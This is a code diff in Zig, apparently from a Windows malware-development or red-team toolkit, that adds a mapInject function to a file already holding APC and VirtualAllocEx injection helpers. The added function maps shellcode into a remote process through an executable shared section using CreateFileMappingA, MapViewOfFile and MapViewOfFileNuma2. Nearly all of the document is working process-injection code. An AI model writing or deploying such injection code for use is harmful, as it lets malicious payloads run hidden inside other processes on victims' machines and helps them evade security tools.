@@ -5,6 +5,8 @@ const HANDLE = win.HANDLE;
 const PAGE_PROTECTION_FLAGS = win.PAGE_PROTECTION_FLAGS;
 const LPTHREAD_START_ROUTINE = win.LPTHREAD_START_ROUTINE;
 const INFINITE = win.INFINITE;
+const INVALID_HANDLE_VALUE = win.INVALID_HANDLE_VALUE;
+const PAGE_EXECUTE_READWRITE = win.PAGE_EXECUTE_READWRITE;
 
 const VirtualAllocEx = win.VirtualAllocEx;
 const VirtualFreeEx = win.VirtualFreeEx;
@@ -17,6 +19,9 @@ const WaitForSingleObject = win.WaitForSingleObject;
 const GetModuleHandleA = win.GetModuleHandleA;
 const GetProcAddress = win.GetProcAddress;
 const QueueUserAPC = win.QueueUserAPC;
+const CreateFileMappingA = win.CreateFileMappingA;
+const MapViewOfFile = win.MapViewOfFile;
+const MapViewOfFile2 = win.MapViewOfFileNuma2;
 
 pub fn allocateMemory(comptime T: type, h_process: HANDLE, data: []const T) !*anyopaque {
     const data_size = (data.len + 1) * @sizeOf(T);
@@ -123,4 +128,50 @@ pub fn injectShellCodeViaApc(h_process: HANDLE, h_thread: HANDLE, shell_code: []
         std.debug.print("[!] QueueUserAPC Failed With Error: {s}\n", .{@tagName(GetLastError())});
         return error.QueueUserAPCFailed;
     }
+}
+
+pub fn mapInject(h_process: HANDLE, shell_code: []const u8) !struct {
+    map_local_address: *anyopaque,
+    map_remote_address: *anyopaque,
+} {
+    const h_file = CreateFileMappingA(
+        INVALID_HANDLE_VALUE,
+        null,
+        .{ .PAGE_EXECUTE_READWRITE = 1 },
+        0,
+        @intCast(shell_code.len),
+        null,
+    ) orelse {
+        std.debug.print("[!] CreateFileMappingA Failed With Error: {s}\n", .{@tagName(GetLastError())});
+        return error.CreateFileMappingAFailed;
+    };
+    defer _ = CloseHandle(h_file);
+
+    const map_local_address = MapViewOfFile(
+        h_file,
+        .{ .READ = 1, .WRITE = 1 },
+        0,
+        0,
+        @intCast(shell_code.len),
+    ) orelse {
+        std.debug.print("[!] MapViewOfFile Failed With Error: {s}\n", .{@tagName(GetLastError())});
+        return error.MapViewOfFilefailed;
+    };
+    @memcpy(@as([*]u8, @ptrCast(map_local_address)), shell_code);
+
+    const map_remote_address = MapViewOfFile2(
+        h_file,
+        h_process,
+        0,
+        null,
+        0,
+        0,
+        @bitCast(PAGE_EXECUTE_READWRITE),
+        0,
+    ) orelse {
+        std.debug.print("[!] MapViewOfFile2 Failed With Error: {s}\n", .{@tagName(GetLastError())});
+        return error.MapViewOfFile2Failed;
+    };
+
+    return .{ .map_local_address = map_local_address, .map_remote_address = map_remote_address };
 }
